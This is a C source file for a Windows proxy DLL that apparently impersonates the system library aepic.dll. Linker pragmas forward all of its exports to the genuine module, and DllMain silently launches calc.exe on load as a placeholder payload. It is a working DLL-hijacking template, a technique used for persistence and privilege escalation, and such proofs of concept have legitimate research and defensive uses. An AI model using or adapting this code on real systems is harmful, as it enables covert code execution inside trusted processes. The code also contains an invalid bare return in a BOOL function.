#include <windows.h>
#pragma comment(lib, "user32.lib")

//dll proxy
#pragma comment(linker, "/export:DllCanUnloadNow=aepic.DllCanUnloadNow");
#pragma comment(linker, "/export:DllGetActivationFactory=aepic.DllGetActivationFactory");
#pragma comment(linker, "/export:GetAppInventoryCore=aepic.GetAppInventoryCore");
#pragma comment(linker, "/export:GetPrivacyLevel=aepic.GetPrivacyLevel");
#pragma comment(linker, "/export:PicAmiClose=aepic.PicAmiClose");
#pragma comment(linker, "/export:PicAmiInitialize=aepic.PicAmiInitialize");
#pragma comment(linker, "/export:PicFreeFileInfo=aepic.PicFreeFileInfo");
#pragma comment(linker, "/export:PicRetrieveFileInfo=aepic.PicRetrieveFileInfo");
#pragma comment(linker, "/export:PicRetrieveFileInfoAppx=aepic.PicRetrieveFileInfoAppx");
#pragma comment(linker, "/export:PicRetrieveFileLastRunTime=aepic.PicRetrieveFileLastRunTime");
#pragma comment(linker, "/export:PicUpdateFileLastRunTime=aepic.PicUpdateFileLastRunTime");
#pragma comment(linker, "/export:UpdateSoftwareInventoryTC2=aepic.UpdateSoftwareInventoryTC2");

BOOL WINAPI DllMain(HANDLE DLL, DWORD dwReason, LPVOID LpReserved)
{
    switch(dwReason)
    {
        case DLL_PROCESS_ATTACH:
                
            STARTUPINFO si;
            PROCESS_INFORMATION pi;

            ZeroMemory( &si, sizeof(si) );
            si.cb = sizeof(si);
            ZeroMemory( &pi, sizeof(pi) );

            // Start the child process. 
            if(!CreateProcess("C:\\Windows\\System32\\calc.exe",NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL ,NULL ,&si ,&pi))
                // NULL,   // No module name (use command line)
                // argv[1],        // Command line
                // NULL,           // Process handle not inheritable
                // NULL,           // Thread handle not inheritable
                // FALSE,          // Set handle inheritance to FALSE
                // 0,              // No creation flags
                // NULL,           // Use parent's environment block
                // NULL,           // Use parent's starting directory 
                // &si,            // Pointer to STARTUPINFO structure
                // &pi )           // Pointer to PROCESS_INFORMATION structure                 
            {
                printf( "CreateProcess failed (%d).\n", GetLastError() );
                return;
            }
            // Wait until child process exits.
            // WaitForSingleObject( pi.hProcess, INFINITE );

            // Close process and thread handles. 
            CloseHandle( pi.hProcess );
            CloseHandle( pi.hThread );
                
        break;
    }

    return TRUE;
}